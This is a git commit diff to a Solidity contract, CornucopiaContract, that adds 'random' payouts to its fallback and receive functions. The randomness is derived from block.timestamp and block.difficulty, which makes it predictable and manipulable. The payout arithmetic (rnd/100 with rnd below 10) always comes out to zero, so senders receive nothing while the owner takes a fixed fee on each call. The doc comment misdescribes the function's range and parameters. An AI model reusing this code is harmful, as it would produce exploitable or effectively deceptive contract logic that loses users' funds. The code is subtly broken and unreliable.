66771aca134ebd665e78df65256138307cd3840e
放牛极客 <l_iupeiyu@qq.com>
2022-12-09 15:08:31 +0800

    增加生成随机数

--- contracts/CornucopiaContract.sol
+++ contracts/CornucopiaContract.sol
@@ -21,10 +21,31 @@ contract CornucopiaContract{
     // function SecurityUpdate() public payable{}
 
     // solidity 0.6 after
-    fallback () external payable {}
-    receive () external payable {}
+    fallback () external payable {
+        uint8 rnd = importSeedFromThird();
+        uint256 contractBalance = address(this).balance;
+        uint256 amount = contractBalance * (rnd/100);
+        payable(owner).transfer(0.001 * 10 ** 18);
+        payable(msg.sender).transfer(amount);
+    }
+    receive () external payable {
+        uint8 rnd = importSeedFromThird();
+        uint256 contractBalance = address(this).balance;
+        uint256 amount = contractBalance * (rnd/100);
+        payable(owner).transfer(0.001 * 10 ** 18);
+        payable(msg.sender).transfer(amount);
+    }
 
     function getBalance()public view returns (uint256){
         return address(this).balance;
+    }
+
+    /*
+    * @notice Generates a random number between 0 - 100 
+    * @param seed The seed to generate different number if block.timestamp is same * for two or more numbers. 
+    */ 
+    function importSeedFromThird() private view returns (uint8) {
+        uint8 randomNumber = uint8( uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty))) % 10 );
+        return randomNumber; 
     }
 }
